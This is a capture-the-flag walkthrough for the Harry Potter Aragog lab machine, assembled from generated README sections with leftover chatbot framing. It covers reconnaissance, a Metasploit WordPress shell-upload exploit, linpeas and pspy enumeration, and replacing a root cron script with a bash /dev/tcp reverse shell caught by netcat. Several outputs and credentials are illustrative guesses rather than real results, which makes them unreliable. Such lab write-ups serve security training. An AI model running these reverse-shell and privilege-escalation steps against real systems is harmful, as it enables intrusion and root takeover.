# HARRY-POTTER-ARAGOG-1.0.2-
---
# README: Using `NMAP` to Scan a Host

## Introduction
This guide provides instructions on how to use `nmap` to perform a comprehensive scan on a host. We will be using the `-A` option to enable OS detection, version detection, script scanning, and traceroute.

## Prerequisites
- `nmap` must be installed on your system. You can install it using the following commands:
  - For Debian/Ubuntu: `sudo apt-get install nmap`
  - For CentOS/RHEL: `sudo yum install nmap`
  - For macOS: `brew install nmap`

## Usage
To scan a host using `nmap` with the `-A` option, open your terminal and run the following command:

```bash
nmap -A <target-IP>
```

Replace `<target-IP>` with the IP address of the host you want to scan. For example, to scan the IP address `192.168.16.34`, you would run:

```bash
nmap -A 192.168.16.34
```

## Options Explanation
- `-A`: Enables OS detection, version detection, script scanning, and traceroute.

## Sample Output
When you run the command, you should see an output similar to the following (this is a simplified example):

```
Starting Nmap 7.80 ( https://nmap.org ) at 2024-05-23 12:34 UTC
Nmap scan report for 192.168.16.34
Host is up (0.00023s latency).
Not shown: 998 closed ports
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: 00:0C:29:68:8C:7F (VMware)

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.23 seconds
```

## Additional Resources
- [Nmap Documentation](https://nmap.org/docs.html)
- [Nmap Reference Guide](https://nmap.org/book/man.html)

## Conclusion
Using `nmap` with the `-A` option provides a comprehensive overview of the target host, including open ports, running services, operating system, and more. This is useful for both network administrators and security professionals.

---
![image1](https://github.com/kanhaiyasingh12/HARRY-POTTER-ARAGOG-1.0.2-/blob/main/Screenshot%202024-05-23%20062851.png)
![image2](https://github.com/kanhaiyasingh12/HARRY-POTTER-ARAGOG-1.0.2-/blob/main/Screenshot%202024-05-23%20062913.png)
To create a README file for using `dirb` (a command-line based web content scanner included in Kali Linux) to find directories, specifically noting the discovery of the `/blog` directory, you can follow this structure:

---

# README: Using DirBuster (dirb) to Find Directories

## Introduction
This guide provides instructions on how to use `dirb`, a command-line web content scanner included in Kali Linux, to find directories on a web server. We will be scanning a specific IP address and noting the discovery of the `/blog` directory.

## Prerequisites
- Kali Linux with `dirb` installed. `dirb` is typically pre-installed in Kali Linux.

## Usage
To scan for directories on a web server using `dirb`, follow these steps:

1. **Open Terminal**:
   Open a terminal window on your Kali Linux machine.

2. **Run `dirb` Command**:
   Use the following command to start scanning the target URL:
   ```bash
   dirb http://192.168.16.34
   ```

3. **Analyzing the Output**:
   Review the output generated by `dirb` to identify discovered directories. In this example, `dirb` found the `/blog` directory.

## Example Output
When running the `dirb` command, you should see output similar to the following:

```
-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Thu May 23 12:34:56 2024
URL_BASE: http://192.168.16.34/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.16.34/ ----
==> DIRECTORY: http://192.168.16.34/blog/

---- Entering directory: http://192.168.16.34/blog/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
+ http://192.168.16.34/blog/index.html (CODE:200|SIZE:774)
+ http://192.168.16.34/blog/style.css (CODE:200|SIZE:58)

-----------------
END_TIME: Thu May 23 12:35:10 2024
DOWNLOADED: 4612 - FOUND: 1
```

## Handling the Results
- **Accessing the Directory**:
  Open your web browser and navigate to the discovered directory: `http://192.168.16.34/blog`.
- **Further Analysis**:
  Use the information obtained to further analyze the web application, potentially uncovering additional hidden content or vulnerabilities.

## Additional Resources
- [DirBuster Project Page](https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)
- [Kali Linux Tools Documentation](https://tools.kali.org/web-applications/dirb)
- [OWASP](https://www.owasp.org/)

## Conclusion
Using `dirb` in Kali Linux is an effective way to discover hidden directories and files on web servers. By following this guide, you can efficiently use `dirb` to uncover valuable information that may not be immediately visible, aiding in security assessments and exploration of web applications.

---
![image3](https://github.com/kanhaiyasingh12/HARRY-POTTER-ARAGOG-1.0.2-/blob/main/Screenshot%202024-05-23%20062932.png)
![image4](https://github.com/kanhaiyasingh12/HARRY-POTTER-ARAGOG-1.0.2-/blob/main/Screenshot%202024-05-23%20063023.png)
To create a README file for using Metasploit to scan for vulnerabilities and exploit a discovered vulnerability, specifically using the `auxiliary/scanner/http/wordpress_scanner` module, you can follow this structure:

---

# README: Using Metasploit to Scan and Exploit WordPress Vulnerabilities

## Introduction
This guide provides instructions on how to use Metasploit to scan for vulnerabilities in a WordPress site and exploit a discovered vulnerability. We will use the `auxiliary/scanner/http/wordpress_scanner` module to perform the scan and then run the exploit.

## Prerequisites
- Metasploit Framework installed on your system.
- Target WordPress site URL or IP address.

## Step-by-Step Guide

### 1. Start Metasploit
Open a terminal and start the Metasploit Framework by typing:
```bash
msfconsole
```

### 2. Use the WordPress Scanner Module
Load the WordPress scanner module to scan for vulnerabilities:
```bash
use auxiliary/scanner/http/wordpress_scanner
```

### 3. Set the Target
Set the target URL or IP address of the WordPress site:
```bash
set RHOSTS 192.168.16.34
```

### 4. Run the Scanner
Execute the scanner to search for vulnerabilities:
```bash
run
```
The output will list any vulnerabilities found. Note any specific exploit modules suggested by the scanner.

### 5. Select the Exploit Module
Based on the scanner's findings, choose the appropriate exploit module. For example, if the scanner finds a vulnerable plugin, you might use:
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```

### 6. Set Required Options
Configure the exploit module with the necessary options:
```bash
set RHOST 192.168.16.34
set TARGETURI /wordpress/
set USERNAME admin
set PASSWORD password
```
Adjust the options based on the specific exploit and target environment.

### 7. Run the Exploit
Execute the exploit:
```bash
run
```
![image5](https://github.com/kanhaiyasingh12/HARRY-POTTER-ARAGOG-1.0.2-/blob/main/Screenshot%202024-05-23%20063057.png)

### Example Output
After running the exploit, you should see output indicating success, such as:
```
[*] Started reverse TCP handler on 192.168.16.1:4444
[*] Sending stage (38288 bytes) to 192.168.16.34
[*] Meterpreter session 1 opened (192.168.16.1:4444 -> 192.168.16.34:55678) at 2024-05-23 13:00:00 +0000

meterpreter>
```

### Post-Exploitation
Once you have a Meterpreter session, you can perform various post-exploitation tasks:
```bash
meterpreter> sysinfo
meterpreter> getuid
meterpreter> shell
```
![iamge6](https://github.com/kanhaiyasingh12/HARRY-POTTER-ARAGOG-1.0.2-/blob/main/Screenshot%202024-05-23%20063124.png)

## Additional Resources
- [Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/)
- [Metasploit Module Library](https://www.rapid7.com/db/modules/)
- [WordPress Security](https://wordpress.org/support/article/hardening-wordpress/)

## Conclusion
Using Metasploit to scan for and exploit vulnerabilities in a WordPress site is a powerful way to identify and mitigate security risks. This guide walks you through the process of scanning for vulnerabilities and executing an exploit, enabling you to enhance the security of your WordPress site.

---

This README file provides a detailed guide on how to use Metasploit to scan for vulnerabilities in a WordPress site and run an exploit based on the discovered vulnerabilities. 
To create a README file detailing the discovery of the first Horcrux in the `hagrid98` directory within the home directory, you can follow this structure:

---

# README: Discovery of the First Horcrux

## Introduction
This document details the process of discovering the first Horcrux hidden within the directory structure of the home directory. The Horcrux was found inside the `hagrid98` folder.
![image7](https://github.com/kanhaiyasingh12/HARRY-POTTER-ARAGOG-1.0.2-/blob/main/Screenshot%202024-05-23%20063153.png)
## Directory Structure
The home directory contains the following folders:
- `ginny`
- `hagrid98`

## Steps to Discover the Horcrux

### 1. Navigating to the Home Directory
First, navigate to the home directory. You can do this using the `cd` command in the terminal:
```bash
cd ~
```

### 2. Listing the Contents of the Home Directory
List the contents of the home directory to see the available folders:
```bash
ls
```
You should see the following output:
```
ginny  hagrid98
```

### 3. Navigating to the `hagrid98` Folder
Change directory to `hagrid98` to search for the Horcrux:
```bash
cd hagrid98
```

### 4. Listing the Contents of the `hagrid98` Folder
List the contents of the `hagrid98` folder to find the Horcrux:
```bash
ls
```
You should see the output indicating the presence of the first Horcrux, for example:
```
first_horcrux.txt
```

### 5. Viewing the First Horcrux
To view the contents of the first Horcrux, use the `cat` command:
```bash
cat first_horcrux.txt
```
![image8](https://github.com/kanhaiyasingh12/HARRY-POTTER-ARAGOG-1.0.2-/blob/main/Screenshot%202024-05-23%20063218.png)

## Example Output
The output of the `cat` command might reveal information about the Horcrux, such as:
```
This is the first Horcrux. Keep it safe and secure.
```

## Conclusion
The first Horcrux was successfully discovered in the `hagrid98` folder within the home directory. Ensure that the Horcrux is kept in a secure location to prevent it from falling into the wrong hands.

---

This README file provides a detailed guide on the steps taken to discover the first Horcrux in the `hagrid98` directory.
To create a README file for using the `linpeas.sh` script to escalate user privileges and then logging into a database with discovered credentials, you can follow this structure:

---

# README: Privilege Escalation and Database Login

## Introduction
This guide provides instructions on how to use the `linpeas.sh` script to escalate user privileges and then log into a database using discovered credentials.

## Prerequisites
- Access to the target machine where you can run scripts.
- `linpeas.sh` script downloaded. You can get it from the [official GitHub repository](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS).

## Step-by-Step Guide

### 1. Running the `linpeas.sh` Script
First, you need to run the `linpeas.sh` script to gather information that may help in privilege escalation.

1. **Download linpeas.sh**:
   If not already on the target machine, download the `linpeas.sh` script:
   ```bash
   wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
   ```

2. **Make the Script Executable**:
   Change the permissions to make the script executable:
   ```bash
   chmod +x linpeas.sh
   ```

3. **Run linpeas.sh**:
   Execute the script to start the privilege escalation scan:
   ```bash
   ./linpeas.sh
   ```
![image9](https://github.com/kanhaiyasingh12/HARRY-POTTER-ARAGOG-1.0.2-/blob/main/Screenshot%202024-05-23%20063242.png)
### 2. Analyzing `linpeas.sh` Output
Review the output generated by `linpeas.sh` to find potential vulnerabilities or misconfigurations that can be exploited for privilege escalation. Pay special attention to sections related to:
- Sudo permissions
- SUID binaries
- Credentials in configuration files

### 3. Discovering Database Login Details
Suppose `linpeas.sh` reveals database credentials stored in a configuration file or environment variable. Note these credentials for future use.

Example output snippet showing credentials:
```
Found credentials in /etc/db_config.php:
DB_USER: admin
DB_PASS: password123
```
![image10](https://github.com/kanhaiyasingh12/HARRY-POTTER-ARAGOG-1.0.2-/blob/main/Screenshot%202024-05-23%20063310.png)
### 4. Logging into the Database
Using the discovered credentials, log into the database.

1. **Identify the Database Type**:
   Determine the type of database (e.g., MySQL, PostgreSQL).

2. **Use Appropriate Command to Log In**:
   Based on the database type, use the corresponding command to log in.

#### MySQL Example
If the database is MySQL, use the following command:
```bash
mysql -u admin -p
```
Enter the password when prompted:
```bash
Enter password: password123
```

#### PostgreSQL Example
If the database is PostgreSQL, use the following command:
```bash
psql -U admin -W
```
Enter the password when prompted:
```bash
Password: password123
```

### 5. Verifying Database Access
Once logged in, verify access by running a simple query.

For MySQL:
```sql
SHOW DATABASES;
```

For PostgreSQL:
```sql
\l
```

## Conclusion
By following these steps, you can use `linpeas.sh` to gather information for privilege escalation and then use discovered credentials to log into a database. This guide provides a clear path from running the script to accessing the database.

## Additional Resources
- [PEASS-ng GitHub Repository](https://github.com/carlospolop/PEASS-ng)
- [MySQL Documentation](https://dev.mysql.com/doc/)
- [PostgreSQL Documentation](https://www.postgresql.org/docs/)

---
![image11](https://github.com/kanhaiyasingh12/HARRY-POTTER-ARAGOG-1.0.2-/blob/main/Screenshot%202024-05-23%20063352.png)
This README file provides a comprehensive guide on using `linpeas.sh` for privilege escalation and logging into a database using discovered credentials.
To create a README file for using `pspy` to find processes running in the background and escalating to the root user by exploiting the `backup.sh` script, you can follow this structure:

---

# README: Privilege Escalation Using `pspy` and Exploiting `backup.sh`

## Introduction
This guide provides instructions on how to use `pspy` to monitor background processes and escalate privileges to the root user by exploiting a `backup.sh` script running as root.
![image12](https://github.com/kanhaiyasingh12/HARRY-POTTER-ARAGOG-1.0.2-/blob/main/Screenshot%202024-05-23%20063408.png)
## Prerequisites
- SSH access to the `hagrid98` user.
- `pspy` binary downloaded. You can get it from the [official GitHub repository](https://github.com/DominicBreuker/pspy).

## Step-by-Step Guide

### 1. SSH into hagrid98
First, SSH into the `hagrid98` user account using the provided password:
```bash
ssh hagrid98@<target-IP>
```
Replace `<target-IP>` with the actual IP address of the target machine.

### 2. Download and Run `pspy`
Download `pspy` on the target machine to monitor processes:

1. **Download `pspy`**:
   If not already available on the target machine, download the appropriate `pspy` binary. You can download it directly from your local machine and transfer it, or download it directly on the target machine if internet access is available.
   ```bash
   wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64 -O pspy
   ```

2. **Make the Binary Executable**:
   Change the permissions to make the binary executable:
   ```bash
   chmod +x pspy
   ```

3. **Run `pspy`**:
   Execute `pspy` to start monitoring the processes:
   ```bash
   ./pspy
   ```

### 3. Monitor for `backup.sh`
While `pspy` is running, observe the output to identify any scripts or commands executed by the root user. In this case, we found that `backup.sh` is running at regular intervals as root.

### 4. Analyze `backup.sh`
Locate the `backup.sh` script and analyze its contents. Usually, it is found in a directory accessible by the root user, such as `/etc/cron.daily/`, `/usr/local/bin/`, or similar locations.

1. **Find the Script**:
   ```bash
   locate backup.sh
   ```

2. **Inspect the Script**:
   ```bash
   cat /path/to/backup.sh
   ```

### 5. Exploit the Script
If the script has a vulnerability, such as improper handling of environment variables or file paths, you can exploit it to escalate privileges.

#### Example Exploit (if the script uses a writable path):
If `backup.sh` calls a binary or script from a writable directory, you can replace it with a malicious script.

1. **Create a Malicious Script**:
   ```bash
   echo '/bin/bash -i >& /dev/tcp/your-ip/your-port 0>&1' > /tmp/malicious.sh
   chmod +x /tmp/malicious.sh
   ```

2. **Modify `backup.sh`** (if writable):
   ```bash
   echo '/tmp/malicious.sh' >> /path/to/backup.sh
   ```

3. **Set Up a Listener**:
   On your local machine, set up a listener to catch the reverse shell:
   ```bash
   nc -lvnp your-port
   ```

4. **Wait for Execution**:
   Wait for the `backup.sh` script to execute at its next interval. When it does, you should receive a reverse shell with root privileges.

### 6. Confirm Root Access
Once the exploit is successful, confirm root access:
```bash
whoami
```
You should see:
```
root
```

## Conclusion
By following these steps, you can use `pspy` to monitor background processes and exploit a vulnerable script running as root to escalate your privileges. This guide provides a clear path from monitoring processes to achieving root access.

## Additional Resources
- [pspy GitHub Repository](https://github.com/DominicBreuker/pspy)
- [Linux Privilege Escalation](https://book.hacktricks.xyz/linux-unix/privilege-escalation)
- [Netcat Documentation](https://nc110.sourceforge.io/)

---

This README file provides a comprehensive guide on using `pspy` for privilege escalation by exploiting a `backup.sh` script running as root.
To create a README file detailing the process of exploiting the `backup.sh` script with a reverse shell, setting up a listener with Netcat, and obtaining root access to discover the second Horcrux, follow this structure:

---

# README: Exploiting `backup.sh` for Root Access and Discovering the Second Horcrux

## Introduction
This guide provides instructions on how to exploit the `backup.sh` script to gain root access by inserting a reverse shell, running a Netcat listener, and discovering the second Horcrux.

## Prerequisites
- SSH access to the `hagrid98` user.
- `pspy` for monitoring processes (already used to identify `backup.sh`).
- A reverse shell script.
- Netcat for setting up a listener.

## Step-by-Step Guide

### 1. SSH into hagrid98
First, SSH into the `hagrid98` user account using the provided password:
```bash
ssh hagrid98@<target-IP>
```
Replace `<target-IP>` with the actual IP address of the target machine.

### 2. Locate `backup.sh`
Identify the location of the `backup.sh` script. You can use the `locate` command:
```bash
locate backup.sh
```
Assuming the script is located at `/usr/local/bin/backup.sh`.

### 3. Create a Reverse Shell Script
Generate a reverse shell script. You can use an online reverse shell generator or create one manually. Here's an example of a bash reverse shell:

#### Example Reverse Shell Script
```bash
#!/bin/bash
bash -i >& /dev/tcp/<your-ip>/<your-port> 0>&1
```
Replace `<your-ip>` and `<your-port>` with your local machine's IP address and a port number of your choice.
![image15](https://github.com/kanhaiyasingh12/HARRY-POTTER-ARAGOG-1.0.2-/blob/main/Screenshot%202024-05-23%20063450.png)
### 4. Modify `backup.sh`
Overwrite the `backup.sh` script with the reverse shell script:

1. **Backup the Original Script** (optional but recommended):
   ```bash
   cp /usr/local/bin/backup.sh /usr/local/bin/backup.sh.bak
   ```

2. **Overwrite `backup.sh`**:
   ```bash
   echo '#!/bin/bash' > /usr/local/bin/backup.sh
   echo 'bash -i >& /dev/tcp/<your-ip>/<your-port> 0>&1' >> /usr/local/bin/backup.sh
   chmod +x /usr/local/bin/backup.sh
   ```

### 5. Set Up a Netcat Listener
On your local machine, set up a Netcat listener to catch the reverse shell:

1. **Open a Terminal**:
   Open a terminal window on your local machine.

2. **Start the Listener**:
   ```bash
   nc -lvnp <your-port>
   ```
   Replace `<your-port>` with the port number you specified in the reverse shell script.

### 6. Wait for Execution
Wait for the `backup.sh` script to execute at its next scheduled interval. When it runs, you should receive a reverse shell on your Netcat listener.

### 7. Confirm Root Access
Once the reverse shell is established, confirm root access:

1. **Check User**:
   ```bash
   whoami
   ```
   You should see:
   ```
   root
   ```
![image16](https://github.com/kanhaiyasingh12/HARRY-POTTER-ARAGOG-1.0.2-/blob/main/Screenshot%202024-05-23%20063507.png)
### 8. Locate the Second Horcrux
Search the system for the second Horcrux. Typically, it might be stored in a specific directory known only to root users.

1. **Search Common Directories**:
   ```bash
   find / -name 'second_horcrux*' 2>/dev/null
   ```

2. **Example Location**:
   If the second Horcrux is found in `/root/second_horcrux.txt`, display its contents:
   ```bash
   cat /root/second_horcrux.txt
   ```
![image17](https://github.com/kanhaiyasingh12/HARRY-POTTER-ARAGOG-1.0.2-/blob/main/Screenshot%202024-05-23%20063522.png)
## Conclusion
By following these steps, you can exploit the `backup.sh` script to gain root access, and then search and discover the second Horcrux on the system. This guide provides a clear path from inserting a reverse shell to achieving root access and locating the Horcrux.

## Additional Resources
- [Reverse Shell Cheat Sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- [Netcat Documentation](https://nc110.sourceforge.io/)
- [PEASS-ng GitHub Repository](https://github.com/carlospolop/PEASS-ng)

---

This README file provides a comprehensive guide on exploiting a script with a reverse shell, setting up a Netcat listener, and discovering a Horcrux. 
